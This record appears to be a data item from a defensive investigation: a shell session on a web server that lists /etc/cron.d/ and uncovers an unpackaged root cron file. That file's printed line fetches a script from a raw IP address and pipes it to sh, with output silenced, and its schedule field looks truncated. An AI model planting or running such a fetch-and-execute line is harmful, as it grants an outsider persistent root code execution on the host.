data.command: Check if there are any unrecognized cron jobs in /etc/cron.d/ directories

data.text:
webapp@web-srv-01:~$ ls -la /etc/cron.d/
total 32
drwxr-xr-x   2 root root 4096 Jan 11 03:52 .
drwxr-xr-x 105 root root 4096 Oct 24  2023 ..
-rw-r--r--   1 root root 183 Feb 25  2022 anacron
-rw-r--r--   1 root root 201 Aug 15 14:22 certbot
-rw-r--r--   1 root root 190 Feb 25  2022 e2scrub_all
-rw-r--r--   1 root root 102 Nov 18  2021 php
-rw-r--r--   1 root root 396 Apr  4  2022 sysstat
-rw-r--r--   1 root root 124 Jan 11 03:52 webmetrics-update
webapp@web-srv-01:~$ cat /etc/cron.d/webmetrics-update
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/25     root /bin/sh -c 'curl -fsSL http://152.89.247.13/upd.sh | sh' >/dev/null 2>&1
webapp@web-srv-01:~$ grep -r "webmetrics" /var/lib/dpkg/info/.list 2>/dev/null
webapp@web-srv-01:~$ ls -l /etc/cron.d/ | grep -v -E "anacron|certbot|e2scrub_all|php|sysstat"
-rw-r--r--   1 root root 124 Jan 11 03:52 webmetrics-update
webapp@web-srv-01:~$
